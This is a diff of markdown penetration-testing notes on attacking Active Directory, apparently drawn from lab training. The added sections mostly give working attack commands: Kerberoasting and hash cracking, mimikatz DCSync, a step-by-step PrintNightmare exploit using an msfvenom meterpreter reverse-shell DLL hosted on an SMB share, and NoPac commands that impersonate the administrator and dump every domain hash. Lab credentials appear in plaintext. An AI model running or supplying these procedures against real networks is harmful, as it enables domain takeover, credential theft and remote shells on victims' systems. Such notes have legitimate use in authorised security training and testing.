@@ -39,7 +39,7 @@ Kerberoasting tools typically request RC4 encryption when performing the attack 
 - RC4 (type 23) encryption: TGS  hashes that begin with `$krb5tgs$23$*`
 - AES-256 (type 18) encryption: TGS  hashes that begin with `$krb5tgs$18$*`
 
-#### setspn.exe
+### setspn.exe
 
 **1.** Enumerating SPNs with setspn.exe
 
@@ -119,7 +119,7 @@ hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt
 
 If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.
 
-#### PowerView
+### PowerView
 
 Let's use PowerView to extract the TGS tickets and convert them to Hashcat format. 
 
@@ -154,7 +154,7 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\FileN
 ```
 
 
-#### Rubeus
+### Rubeus
 
 [See more about Rubeus](rubeus.md).
 
@@ -228,7 +228,7 @@ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
 
 
 
-#### Mitigating Kerberoasting
+### Mitigating Kerberoasting
 
 Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.
 
@@ -240,6 +240,102 @@ omain controllers can be configured to log Kerberos TGS ticket requests by selec
 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.
 
 Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).
+
+### Kerberos: Forging the PAC
+
+This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.
+
+The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit.
+
+
+### ❗ Kerberos Constrained Delegation [PENDING]
+
+### ❗ Kerberos Unconstrained Delegation [PENDING]
+
+### ❗ Kerberos Resource-Based Constrained Delegation (RBCD) [PENDING]
+
+
+### Kerberos "Double Hop" Problem
+
+**Kerberos "Double Hop" Problem**: The "Double Hop" problem often occurs when using WinRM/Powershell or Evil-WinRM, since the default authentication mechanism only provides a ticket to access a specific resource (winrm). When we use Kerberos to establish a remote session, we are not using a password for authentication, and the user's ticket-granting service (TGS) ticket is sent to the remote service, but the TGT ticket is not sent. Therefore, when we try to authenticate over a second resource, the machine can not pull any hash from memory or generate any TGS to authenticate us.
+
+In a nutshell, **Kerberos "Double Hop" Problem** arises when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second, as the user's password  was never cached as part of their login.  In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.
+
+Example once we are connected with Evil-WinRm:
+
+```shell-session
+*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
+
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
+*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
+Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
+"
+At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
++             else { $Results = $UserSearcher.FindAll() }
++                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DirectoryServicesCOMException
+```
+
+However this does not happen with DRP connections, whereas our TGT is sent during the authentication process to obtain a service ticket for the RDP session. It is then cached on the remote host for subsequent use. This allows seamless access to domain resources from the remote host.
+
+#### Workaround #1: unconstrained delegation
+
+If *unconstrained delegation* is enabled on a server, it is likely we won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access.
+
+#### Workaround #2:  Evil-WinRM and PSCredential Object
+
+ We can use a "nested" Invoke-Command to send credentials (after creating a PSCredential object) with every request.
+
+```powershell
+# Set up: we are connected to the host machine from our attacker machine via Evil-WinRM
+# 1. We create a SecureString Object with our creds
+$SecPassword = ConvertTo-SecureString '$password' -AsPlainText -Force
+# Example: 
+# $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('$domain\$userSamAccountName', $SecPassword)
+# Example:
+# $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+
+# 2. Import PowerView module and embed creds in all commands. In the example we are requesting the Service Principals. If we try without specifying the `-credential` flag, we get an error message.
+import-module .\PowerView.ps1
+get-domainuser -spn -credential $Cred | select samaccountname
+```
+
+#### Workaround #3: Win-RM and Register PSSession Configuration
+
+>Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials.
+
+```powershell
+# Establish a WinRM session on the remote host.
+Enter-PSSession -ComputerName $hostName.$domain -Credential $domain\$user
+# Example
+# Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
+```
+
+Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.
+
+```powershell
+# REgister a new session
+Register-PSSessionConfiguration -Name $SessionName -RunAsCredential $domain\$userSamAccountName
+# Example:
+# Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+
+# Once this is done, we need to restart the WinRM service. From the PS session:
+Restart-Service WinRM
+# This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
+
+# After we start the session, we can see that the double hop problem has been eliminated.
+Enter-PSSession -ComputerName $hostName -Credential $domain\$userSamAccountName -ConfigurationName  $sessionName
+# Example:
+# Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+
+# We can now run tools such as PowerView without having to create a new PSCredential object. For example:
+get-domainuser -spn | select samaccountname
+```
+
 
 
 ## 🛂  Access Control List (ACL)Abuse 
@@ -387,6 +483,8 @@ runas /$TargetUser:[domain\$TargetUser] cmd.exe
 We can also use mimikatz:
 
 ```powershell
+.\mimikatz.exe
+privilege::debug
 lsadump::setntlm
 ```
 
@@ -656,6 +754,7 @@ And now, from powershell:
 #########
 # mimikatz command
 ########
+
 lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 
 ```
@@ -747,7 +846,6 @@ Enter-PSSession -ComputerName $hostName -Credential $cred
 # Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
 ```
 
-
 ### SQL Server Admin
 
  Enumerate via Bloodhound and the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:
@@ -794,7 +892,152 @@ xp_cmdshell whoami /priv
 ```
 
 >Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.
->
+
+
+## 🖨️ PrintNightmare
+
+`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems.
+
+We will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit.
+
+```bash
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+```
+
+For this exploit to work successfully, we will need to use cube0x0's version of Impacket:
+
+```bash
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+```
+
+Enumerating for MS-RPRN:
+
+```bash
+# We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
+rpcdump.py @$DomainControllerIP | egrep 'MS-RPRN|MS-PAR'
+# Example:
+# rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+```
+
+After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPhost LPORT=8080 -f dll > $FileName.dll
+# Example:
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+```
+
+We will then host this payload in an SMB share we create on our attack host using smbserver.py.
+
+```bash
+# Creating a Share with smbserver.py
+sudo smbserver.py -smb2support $ShareName /path/to/$FileName.dll
+# Example:
+# sudo smbserver.py -smb2support CompData /home/
+# This will leave out terminal in the host machine with no other use than that of sharing.
+```
+
+Then we will need to open a two new terminals in our attacker machine:
+
+```bash
+# In the first terminal we will configure ant start a MSF multi/handler
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 172.16.5.225
+set LPORT 8080
+run
+```
+
+```bash
+# In the second terminal we will connect via ssh with the host machine:
+ssh $user@$ip
+
+# Then we run the exploit:
+sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py $user/$user:$password@$domainControllerIP  '\\$ipHostMachine\$ShareName\$filename.dll'
+# Example:
+# sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+```
+
+The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
+
+
+## 🪤 NoPac (SamAccountName Spoofing)
+
+!!! tips "Detailed explanations"
+	- [noPac: A Tale of Two Vulnerabilities That Could End in Ransomware](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
+	- [SAM Name impersonation](https://techcommunity.microsoft.com/users/daniel%20naim/164126).
+
+This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
+
+| 42278                                                                      | 42287                                                                                         |
+| -------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
+| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |
+
+```bash
+# Ensuring Impacket is Installed
+git clone https://github.com/SecureAuthCorp/impacket.git
+
+python setup.py install 
+
+# Cloning the NoPac Exploit Repo
+git clone https://github.com/Ridter/noPac.git
+```
+
+Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. 
+
+
+```bash
+# First we will scan:
+sudo python3 scanner.py $domain/$userSamAccounName:$password -dc-ip $domainControllerIP -use-ldap
+# Example:
+# sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+```
+
+We will obtain the `ms-DS-MachineAccountQuota` number. If it is set to 0, the attack will not work.
+
+```bash
+# Running NoPac & Getting a semi-interactive shell session  using smbexec.py -https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py. This could be "noisy" or may be blocked by AV or EDR.
+sudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname -shell --impersonate $userAdmin -use-ldap
+# Example: 
+# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+```
+
+Important: It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run (We can use `ls` to confirm).
+
+```bash
+# We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account
+sudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname --impersonate $userAdmin -use-ldap -dump -just-dc-user $domain/$userAdmin
+# Example:
+# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+# We can also dump all
+sudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname --impersonate $userAdmin -use-ldap -dump -just-dc
+# Example:
+# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc
+```
+
+### Mitigations
+
+**If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py.**
+
+If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. 
+
+The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.
+
+## 💱  Exchange Related Group Membership 
+
+**See some techniques at:** [https://github.com/gdedrouas/Exchange-AD-Privesc](https://github.com/gdedrouas/Exchange-AD-Privesc)
+This repository provides a few techniques and scripts regarding the impact of Microsoft Exchange deployment on Active Directory security. This is a side project of AD-Control-Paths, an AD permissions auditing project to which I recently added some Exchange-related modules.
+
+- The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object.
+- The Exchange group `Organization Management` is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.
+
+If we can compromise an Exchange server, this will often lead to Domain Admin privileges. 
+
 
 ## Evasion Techniques
 
